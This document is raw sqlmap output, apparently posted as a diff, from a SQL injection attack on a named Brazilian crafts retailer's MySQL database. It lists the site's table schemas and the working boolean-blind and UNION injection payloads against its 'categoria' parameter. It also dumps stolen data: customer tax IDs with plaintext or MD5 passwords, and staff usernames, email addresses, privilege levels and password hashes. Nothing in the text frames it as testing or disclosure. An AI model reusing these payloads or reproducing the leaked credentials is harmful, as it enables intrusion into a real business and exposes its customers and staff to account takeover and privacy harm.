++-----------+------------------+
+| cdata     | varchar(45)      |
+| cemail    | varchar(55)      |
+| ctelefone | varchar(20)      |
+| ncodi     | int(10) unsigned |
+| nome      | varchar(65)      |
++-----------+------------------+
+
+Database: silvasartesana3
+Table: filtros
+[2 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| id     | int(10) unsigned |
+| nome   | varchar(65)      |
++--------+------------------+
+
+Database: silvasartesana3
+Table: fpgto
+[7 columns]
++-------------+------------------+
+| Column      | Type             |
++-------------+------------------+
+| cforma      | varchar(45)      |
+| id          | int(10) unsigned |
+| ncodi       | int(10) unsigned |
+| ndescavista | decimal(7,2)     |
+| nnumparc    | int(10) unsigned |
+| nprazo      | tinyint(1)       |
+| nvalor      | decimal(7,2)     |
++-------------+------------------+
+
+Database: silvasartesana3
+Table: receber
+[15 columns]
++---------------+---------------+
+| Column        | Type          |
++---------------+---------------+
+| CBOLETO       | varchar(20)   |
+| CHISTORICO    | text          |
+| CNOMECLIENTE  | varchar(40)   |
+| CNUMDOC       | varchar(13)   |
+| cstatus       | char(1)       |
+| DEMISSAO      | date          |
+| DRECEBIMENTO  | date          |
+| DVENCIMENTO   | date          |
+| NBANCO        | smallint(3)   |
+| NCODCLIENTE   | mediumint(5)  |
+| NPAGO         | decimal(12,2) |
+| NRESTANTE     | decimal(12,2) |
+| NTIPODOC      | tinyint(2)    |
+| NVALORINICIAL | decimal(12,2) |
+| NVENDA        | mediumint(7)  |
++---------------+---------------+
+
+Database: silvasartesana3
+Table: bloqueios
+[3 columns]
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| id        | int(20) unsigned |
+| idpagina  | int(10) unsigned |
+| idusuario | int(10) unsigned |
++-----------+------------------+
+
+Database: silvasartesana3
+Table: promocoes
+[3 columns]
++---------+------------------+
+| Column  | Type             |
++---------+------------------+
+| cnome   | varchar(65)      |
+| ctitulo | varchar(85)      |
+| ncodi   | int(10) unsigned |
++---------+------------------+
+
+Database: silvasartesana3
+Table: historico
+[11 columns]
++--------------+------------------+
+| Column       | Type             |
++--------------+------------------+
+| catendente   | varchar(25)      |
+| ccontato     | varchar(45)      |
+| chistorico   | varchar(155)     |
+| choraretorno | varchar(20)      |
+| cstatus      | varchar(45)      |
+| ddata        | date             |
+| ddataretorno | date             |
+| id           | int(10) unsigned |
+| lativo       | tinyint(1)       |
+| ncodicliente | int(10) unsigned |
+| nvendedor    | int(10) unsigned |
++--------------+------------------+
+
+Database: silvasartesana3
+Table: produtos
+[30 columns]
++-----------------+------------------+
+| Column          | Type             |
++-----------------+------------------+
+| ativo           | tinyint(1)       |
+| c000            | tinyint(1)       |
+| c001            | tinyint(1)       |
+| c002            | tinyint(1)       |
+| c004            | tinyint(1)       |
+| c005            | tinyint(1)       |
+| c006            | tinyint(1)       |
+| c008            | tinyint(1)       |
+| c009            | tinyint(1)       |
+| c010            | tinyint(1)       |
+| c012            | tinyint(1)       |
+| c013            | tinyint(1)       |
+| c014            | tinyint(1)       |
+| c015            | tinyint(1)       |
+| c016            | tinyint(1)       |
+| c017            | tinyint(4)       |
+| cCaracteristica | varchar(45)      |
+| cimagem1        | varchar(75)      |
+| cimagem2        | varchar(75)      |
+| cimagem3        | varchar(75)      |
+| cnome           | varchar(65)      |
+| cobs            | text             |
+| id              | int(10) unsigned |
+| lcampanha       | tinyint(1)       |
+| lcampanha2      | tinyint(1)       |
+| llancamento     | tinyint(1)       |
+| ncategoria      | int(10) unsigned |
+| ndesconto       | decimal(4,2)     |
+| nfracao         | decimal(4,2)     |
+| numvisitas      | int(7) unsigned  |
++-----------------+------------------+
+
+Database: silvasartesana3
+Table: vendas_tipos
+[3 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| descricao | varchar(100) |
+| id        | int(11)      |
+| site      | tinyint(4)   |
++-----------+--------------+
+
+Database: silvasartesana3
+Table: cupons
+[4 columns]
++---------------+------------------+
+| Column        | Type             |
++---------------+------------------+
+| ccupom        | varchar(45)      |
+| ddatavalidade | datetime         |
+| ncodi         | int(10) unsigned |
+| ndesconto     | decimal(7,2)     |
++---------------+------------------+
+
+Database: silvasartesana3
+Table: regiao0
+[3 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| cregiao | varchar(6)   |
+| ctabela | varchar(10)  |
+| nminimo | decimal(7,2) |
++---------+--------------+
+
+Database: silvasartesana3
+Table: orcamentositens
+[9 columns]
++-------------+-----------------+
+| Column      | Type            |
++-------------+-----------------+
+| bcombo      | tinyint(1)      |
+| cvolume     | varchar(99)     |
+| ncodpro     | int(5) unsigned |
+| ndesconto   | decimal(4,2)    |
+| nitem       | int(3) unsigned |
+| nnupd       | int(9) unsigned |
+| npreco      | decimal(7,2)    |
+| nquantidade | decimal(7,3)    |
+| seditado    | varchar(2)      |
++-------------+-----------------+
+
+Database: silvasartesana3
+Table: orcamentos
+[39 columns]
++----------------------+------------------+
+| Column               | Type             |
++----------------------+------------------+
+| btransferida         | int(1) unsigned  |
+| cbairroEntrega       | varchar(45)      |
+| ccepEntrega          | varchar(10)      |
+| ccidadeEntrega       | varchar(55)      |
+| ccompEntrega         | varchar(45)      |
+| ccontato             | varchar(65)      |
+| ccupom               | varchar(45)      |
+| cendEntrega          | varchar(85)      |
+| cestadoEntrega       | varchar(45)      |
+| cimgStatus           | varchar(95)      |
+| cmotivoreprova       | varchar(50)      |
+| cobs                 | varchar(350)     |
+| cobsInterna          | varchar(350)     |
+| ddata                | datetime         |
+| ddataaval            | datetime         |
+| descontoitens        | decimal(12,2)    |
+| descontovendedor     | decimal(12,2)    |
+| lanalise             | tinyint(1)       |
+| laprovadaFin         | tinyint(1)       |
+| lavalvendedor        | tinyint(1)       |
+| lcancela             | tinyint(1)       |
+| lentregue            | tinyint(1)       |
+| limprimiu            | tinyint(1)       |
+| ncodcliente          | int(6) unsigned  |
+| ncodvendedor         | int(6) unsigned  |
+| ncondpgto            | int(2) unsigned  |
+| ndescontocupom       | decimal(7,2)     |
+| nnumvenda            | int(10) unsigned |
+| nnupd                | int(9) unsigned  |
+| nota                 | varchar(45)      |
+| npgtofrete           | int(2) unsigned  |
+| nvalordesconto       | decimal(7,2)     |
+| nvalordescontoavista | decimal(7,2)     |
+| nvalortaxa           | decimal(7,2)     |
+| nvalortotal          | decimal(12,2)    |
+| origem               | int(11)          |
+| tipo                 | int(11)          |
+| transportadora       | tinyint(1)       |
+| transportadora2      | int(10) unsigned |
++----------------------+------------------+
+
+Database: silvasartesana3
+Table: categorias
+[4 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| cnome  | varchar(55)      |
+| ddata  | date             |
+| imagem | varchar(100)     |
+| ncodi  | int(10) unsigned |
++--------+------------------+
+
+Database: silvasartesana3
+Table: vendas
+[39 columns]
++----------------------+------------------+
+| Column               | Type             |
++----------------------+------------------+
+| btransferida         | int(1) unsigned  |
+| cbairroEntrega       | varchar(45)      |
+| ccepEntrega          | varchar(10)      |
+| ccidadeEntrega       | varchar(55)      |
+| ccompEntrega         | varchar(45)      |
+| ccontato             | varchar(65)      |
+| ccupom               | varchar(45)      |
+| cendEntrega          | varchar(85)      |
+| cestadoEntrega       | varchar(45)      |
+| cimgStatus           | varchar(95)      |
+| cmotivoReprova       | varchar(45)      |
+| cobs                 | text             |
+| cobsInterna          | text             |
+| ddata                | datetime         |
+| ddataaval            | datetime         |
+| descontoitens        | decimal(12,2)    |
+| descontovendedor     | decimal(12,2)    |
+| lanalise             | tinyint(1)       |
+| laprovadaFin         | tinyint(1)       |
+| lavalvendedor        | tinyint(1)       |
+| lcancela             | tinyint(1)       |
+| lentregue            | tinyint(1)       |
+| limprimiu            | tinyint(1)       |
+| ncodcliente          | int(6) unsigned  |
+| ncodvendedor         | int(6) unsigned  |
+| ncondpgto            | int(2) unsigned  |
+| ndescontocupom       | decimal(7,2)     |
+| nnupd                | int(9) unsigned  |
+| nnupdcacau           | int(10) unsigned |
+| nota                 | varchar(45)      |
+| npgtofrete           | int(2) unsigned  |
+| nvalordesconto       | decimal(7,2)     |
+| nvalordescontoavista | decimal(7,2)     |
+| nvalortaxa           | decimal(7,2)     |
+| nvalortotal          | decimal(12,2)    |
+| origem               | int(2)           |
+| tipo                 | int(2)           |
+| transportadora       | int(10)          |
+| transportadora2      | int(10) unsigned |
++----------------------+------------------+
+
+Database: silvasartesana3
+Table: transportadoras
+[4 columns]
++------------+------------------+
+| Column     | Type             |
++------------+------------------+
+| cnometrans | varchar(45)      |
+| codi       | int(10) unsigned |
+| csitetrans | varchar(85)      |
+| ddatatrans | date             |
++------------+------------------+
+
+Database: silvasartesana3
+Table: vendas_origem
+[3 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| descricao | varchar(100) |
+| id        | int(11)      |
+| site      | tinyint(4)   |
++-----------+--------------+
+
+Database: silvasartesana3
+Table: configs
+[4 columns]
++-----------------+------------------+
+| Column          | Type             |
++-----------------+------------------+
+| cdescricao      | varchar(150)     |
+| cvaloresvalidos | varchar(80)      |
+| ncodi           | int(10) unsigned |
+| valor           | varchar(15)      |
++-----------------+------------------+
+
+Database: silvasartesana3
+Table: usuarios
+[6 columns]
++------------+------------------+
+| Column     | Type             |
++------------+------------------+
+| email      | varchar(90)      |
+| id         | int(10) unsigned |
+| idvendedor | int(10) unsigned |
+| privilegio | varchar(2)       |
+| senha      | varchar(60)      |
+| usuario    | varchar(45)      |
++------------+------------------+
+
+Database: silvasartesana3
+Table: emails
+[5 columns]
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| acesso    | varchar(45)      |
+| cemail    | varchar(65)      |
+| ddatahora | datetime         |
+| id        | int(10) unsigned |
+| qtde      | int(10) unsigned |
++-----------+------------------+
+
+Database: silvasartesana3
+Table: vvendasitens
+[20 columns]
++------------------+------------------+
+| Column           | Type             |
++------------------+------------------+
+| bcombo           | tinyint(1)       |
+| carac            | varchar(45)      |
+| cimagem          | varchar(75)      |
+| cnome            | varchar(75)      |
+| editado          | varchar(2)       |
+| ncodi            | int(10) unsigned |
+| ndesconto        | decimal(4,2)     |
+| ndescontoproduto | decimal(7,2)     |
+| nfracao          | int(10) unsigned |
+| nnupd            | int(9) unsigned  |
+| npreco           | decimal(7,2)     |
+| npreco0          | decimal(6,2)     |
+| nprecoA          | decimal(6,2)     |
+| nprecoB          | decimal(6,2)     |
+| nprecoC          | decimal(6,2)     |
+| nprecoES         | decimal(6,2)     |
+| nprecoNE         | decimal(6,2)     |
+| nprecoNO         | decimal(6,2)     |
+| nprecoPadrao     | decimal(6,2)     |
+| qtde             | decimal(7,3)     |
++------------------+------------------+
+
+Database: silvasartesana3
+Table: carrinhoab
+[5 columns]
++--------------+------------------+
+| Column       | Type             |
++--------------+------------------+
+| bcombo       | tinyint(1)       |
+| ddata        | datetime         |
+| ncodicliente | int(10) unsigned |
+| ncodiproduto | int(10) unsigned |
+| nquantidade  | int(10) unsigned |
++--------------+------------------+
+
+Database: silvasartesana3
+Table: emailvisualizacoes
+[5 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| campanha         | varchar(100) |
+| data             | datetime     |
+| email            | varchar(65)  |
+| id               | int(11)      |
+| numvisualizacoes | int(11)      |
++------------------+--------------+
+
+Database: silvasartesana3
+Table: mkt_visualizacoes
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| campanha | varchar(95)  |
+| data     | datetime     |
+| email    | varchar(100) |
+| id       | int(11)      |
+| qtde     | int(2)       |
++----------+--------------+
+
+Database: silvasartesana3
+Table: promoenviadas
+[3 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| cliente  | int(10) unsigned |
+| promocao | int(10) unsigned |
+| regiao   | varchar(5)       |
++----------+------------------+
+
+Database: silvasartesana3
+Table: vendascotacao
+[9 columns]
++------------------+------------------+
+| Column           | Type             |
++------------------+------------------+
+| ddata            | datetime         |
+| ddatanota        | date             |
+| difcotacao_real  | decimal(8,2)     |
+| nnf              | int(10) unsigned |
+| nnupd            | int(10) unsigned |
+| transportadora   | int(10) unsigned |
+| valorcotacao     | decimal(8,2)     |
+| valorcotacaoreal | decimal(8,2)     |
+| valornf          | decimal(8,2)     |
++------------------+------------------+
+
+Database: silvasartesana3
+Table: boletos
+[46 columns]
++------------------+--------------------------------+
+| Column           | Type                           |
++------------------+--------------------------------+
+| caceite          | enum('S','N')                  |
+| cagencia         | varchar(4)                     |
+| cbairro          | varchar(30)                    |
+| cboleto          | varchar(20)                    |
+| ccarteira        | varchar(50)                    |
+| ccedente         | varchar(40)                    |
+| ccep             | varchar(8)                     |
+| ccidade          | varchar(30)                    |
+| ccnpjcpf         | varchar(14)                    |
+| ccnpjcpfsacado   | varchar(14)                    |
+| ccodigo          | varchar(9)                     |
+| ccomplemento     | varchar(10)                    |
+| cdocumento       | varchar(13)                    |
+| cendereco        | varchar(50)                    |
+| cenderecofirma   | varchar(150)                   |
+| cestado          | varchar(2)                     |
+| cinstrucao1      | varchar(80)                    |
+| cinstrucao2      | varchar(80)                    |
+| clocalpgto       | varchar(80)                    |
+| cmodelo          | varchar(45)                    |
+| cnomefantasia    | varchar(40)                    |
+| coperacao        | varchar(5)                     |
+| csacado          | varchar(40)                    |
+| ctipoimpressao   | enum('M','L')                  |
+| ddatadoc         | date                           |
+| dvencimento      | date                           |
+| lcancelado       | tinyint(1) unsigned            |
+| lquitado         | tinyint(1) unsigned            |
+| nabatimentos     | decimal(12,2)                  |
+| nbanco           | smallint(3) unsigned           |
+| ncarteira        | smallint(4)                    |
+| ncodigo          | int(10) unsigned               |
+| ncodsacado       | mediumint(5) unsigned zerofill |
+| ndesconto        | decimal(12,2)                  |
+| ndiasmulta       | tinyint(2)                     |
+| nespeciemoeda    | tinyint(2) unsigned            |
+| nespecietitulo   | tinyint(2) unsigned            |
+| njurosdia        | decimal(12,2)                  |
+| nmora            | decimal(12,2)                  |
+| nmulta           | decimal(4,2)                   |
+| nnumero          | int(6)                         |
+| noutros          | decimal(12,2)                  |
+| nprazo           | tinyint(2)                     |
+| ntipodoc         | tinyint(2) unsigned            |
+| ntiponossonumero | tinyint(2) unsigned            |
+| nvalor           | decimal(12,2)                  |
++------------------+--------------------------------+
+
+Database: silvasartesana3
+Table: vorcamentositens
+[20 columns]
++------------------+------------------+
+| Column           | Type             |
++------------------+------------------+
+| bcombo           | tinyint(1)       |
+| carac            | varchar(45)      |
+| cimagem          | varchar(75)      |
+| cnome            | varchar(75)      |
+| editado          | varchar(2)       |
+| ncodi            | int(10) unsigned |
+| ndesconto        | decimal(4,2)     |
+| ndescontoproduto | decimal(7,2)     |
+| nfracao          | int(10) unsigned |
+| nnupd            | int(9) unsigned  |
+| npreco           | decimal(7,2)     |
+| npreco0          | decimal(6,2)     |
+| nprecoA          | decimal(6,2)     |
+| nprecoB          | decimal(6,2)     |
+| nprecoC          | decimal(6,2)     |
+| nprecoES         | decimal(6,2)     |
+| nprecoNE         | decimal(6,2)     |
+| nprecoNO         | decimal(6,2)     |
+| nprecoPadrao     | decimal(6,2)     |
+| qtde             | decimal(7,3)     |
++------------------+------------------+
+
+Database: silvasartesana3
+Table: estados
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| cestado     | char(2)      |
+| cobs        | varchar(150) |
+| ncodigoibge | tinyint(2)   |
+| nminimo     | decimal(7,2) |
+| nvalor      | int(2)       |
++-------------+--------------+
+
+Database: silvasartesana3
+Table: setores
+[3 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| cemail | varchar(75)      |
+| cnome  | varchar(55)      |
+| ncodi  | int(10) unsigned |
++--------+------------------+
+
+Database: silvasartesana3
+Table: bancos
+[3 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| codigo | int(11)     |
+| id     | int(11)     |
+| nome   | varchar(45) |
++--------+-------------+
+
+Database: silvasartesana3
+Table: clientes
+[32 columns]
++---------------+------------------+
+| Column        | Type             |
++---------------+------------------+
+| cbairro       | varchar(60)      |
+| ccelular      | varchar(20)      |
+| ccep          | varchar(15)      |
+| ccidade       | varchar(60)      |
+| ccnpj         | varchar(18)      |
+| ccomp         | varchar(40)      |
+| cemail        | varchar(95)      |
+| cemailteste   | varchar(65)      |
+| cendereco     | varchar(70)      |
+| cestado       | varchar(2)       |
+| cfranqueado   | varchar(65)      |
+| cinscricao    | varchar(20)      |
+| cnome         | varchar(65)      |
+| comoachou     | varchar(200)     |
+| crazao        | varchar(65)      |
+| cregiao0      | varchar(6)       |
+| csenha        | varchar(80)      |
+| ctabela       | varchar(10)      |
+| ctel          | varchar(90)      |
+| ddataalter    | date             |
+| ddatacadastro | date             |
+| lliberado     | tinyint(1)       |
+| ncodi         | int(5) unsigned  |
+| nddd          | int(2) unsigned  |
+| ndesconto     | int(10) unsigned |
+| nlimite       | decimal(12,2)    |
+| nvendaprazo   | tinyint(1)       |
+| nvendedor     | int(10) unsigned |
+| obs           | text             |
+| ramo          | varchar(60)      |
+| simples       | tinyint(1)       |
+| solicitasenha | int(1) unsigned  |
++---------------+------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+Table: clientes
+[10 entries]
++----------------+----------------------------------+
+| ccnpj          | csenha                           |
++----------------+----------------------------------+
+| 0              | 03f5296592c9bfafe487f5d5081b46f8 |
+| 00000000001    | 03f5296592c9bfafe487f5d5081b46f8 |
+| 00000000002    | 03f5296592c9bfafe487f5d5081b46f8 |
+| 67601930000171 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 22940146000150 | 101                              |
+| 18490734000242 | 101                              |
+| 09381114000101 | 101                              |
+| 10486133000173 | 101                              |
+| 01660328000105 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 19313622000289 | 101                              |
++----------------+----------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+Table: clientes
+[100 entries]
++----------------+----------------------------------+
+| ccnpj          | csenha                           |
++----------------+----------------------------------+
+| 0              | 03f5296592c9bfafe487f5d5081b46f8 |
+| 00000000001    | 03f5296592c9bfafe487f5d5081b46f8 |
+| 00000000002    | 03f5296592c9bfafe487f5d5081b46f8 |
+| 67601930000171 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 22940146000150 | 101                              |
+| 18490734000242 | 101                              |
+| 09381114000101 | 101                              |
+| 10486133000173 | 101                              |
+| 01660328000105 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 19313622000289 | 101                              |
+| 10574412000199 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 10415940000103 | 101                              |
+| 12576228000103 | 101                              |
+| 50430628000367 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 11072891000108 | 101                              |
+| 22023628000145 | 101                              |
+| 10690127000133 | 101                              |
+| 22725314000194 | 101                              |
+| 23141422000182 | 101                              |
+| 09446086000317 | 101                              |
+| 21648237000153 | 101                              |
+| 60292935000110 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 04682145851    | 03f5296592c9bfafe487f5d5081b46f8 |
+| 11376479000181 | 101                              |
+| 09308251000102 | 101                              |
+| 08760643000145 | 101                              |
+| 00848458000103 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 07975382000118 | 101                              |
+| 63577506000188 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 56539877000100 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 18644094000105 | 101                              |
+| 12157637000175 | 101                              |
+| 20360013000189 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 22853032000172 | 101                              |
+| 09649810000148 | 101                              |
+| 10502978000105 | 101                              |
+| 10715869000176 | 101                              |
+| 07339363000103 | 101                              |
+| 01647575000163 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 23004546000116 | 101                              |
+| 11084355000122 | 101                              |
+| 22851668000185 | 101                              |
+| 21573048000169 | 101                              |
+| 22925030000141 | 101                              |
+| 22851116000177 | 101                              |
+| 12187295000136 | 101                              |
+| 12668876000190 | 101                              |
+| 00025877000137 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 17756291000145 | 101                              |
+| 22859076000100 | 101                              |
+| 11688630000117 | 101                              |
+| 45631751000144 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 03055823000102 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 00573871000102 | 101                              |
+| 01             | 03f5296592c9bfafe487f5d5081b46f8 |
+| 50405257000100 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 01605910000160 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 22979118000146 | 101                              |
+| 10722301000182 | 101                              |
+| 69315901000179 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 08271534000164 | 101                              |
+| 19679291000114 | 101                              |
+| 01             | 03f5296592c9bfafe487f5d5081b46f8 |
+| 02256579000183 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 10302456000160 | 101                              |
+| 22330614000174 | 101                              |
+| 23164214000107 | 101                              |
+| 08792595000177 | 101                              |
+| 22317081000190 | 101                              |
+| 01639899000150 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 19923594000130 | 101                              |
+| 21303443000121 | 101                              |
+| 18730363000148 | 101                              |
+| 14065612000177 | 101                              |
+| 25478199000199 | 101                              |
+| 22983430000103 | 101                              |
+| 22960012000109 | 101                              |
+| 02932279009    | 101                              |
+| 05350754000195 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 22513557000169 | 101                              |
+| 12478693000101 | 101                              |
+| 21575116000129 | 101                              |
+| 15700572000150 | 101                              |
+| 21581725000190 | 101                              |
+| 10800752000190 | 101                              |
+| 22825105000112 | 101                              |
+| 23124141000111 | 101                              |
+| 23421400000176 | 101                              |
+| 23229831000135 | 101                              |
+| 31801455449    | 101                              |
+| 00000000000    | 03f5296592c9bfafe487f5d5081b46f8 |
+| 23120282000166 | 101                              |
+| 23188476000101 | 101                              |
+| 23099457000109 | 101                              |
+| 22572619000103 | 101                              |
+| 15794189000109 | 101                              |
+| 01547955000126 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 57614612000191 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 07742211000149 | 03f5296592c9bfafe487f5d5081b46f8 |
+| 00811343000136 | 03f5296592c9bfafe487f5d5081b46f8 |
++----------------+----------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+Table: usuarios
+[5 entries]
++----+------------+----------------------------------+------------------------------------+-----------+------------+
+| id | idvendedor | senha                            | email                              | usuario   | privilegio |
++----+------------+----------------------------------+------------------------------------+-----------+------------+
+| 1  | 6          | c8e65f57be58b5359658ea3e9ae28b8c | fiscal@silvasartesanatos.com.br    | Fiscal    | F          |
+| 2  | 6          | 0c32fc41ea256523d70f686ed2c3381d | gustavo@silvasartesanatos.com.br   | gustavo   | S          |
+| 4  | 8          | c8e65f57be58b5359658ea3e9ae28b8c | magali@apoiorepresentacoes.com.br  | apoio     | V          |
+| 8  | 35         | 9e8f99b9e2b23bcabf223e1a064f808e | lpenha@lpenha.com.br               | cleverson | V          |
+| 10 | 40         | 01ed9db7e76ff648aecb78702619a322 | cacaushow@silvasartesanatos.com.br | V          |
++----+------------+----------------------------------+------------------------------------+-----------+------------+
+
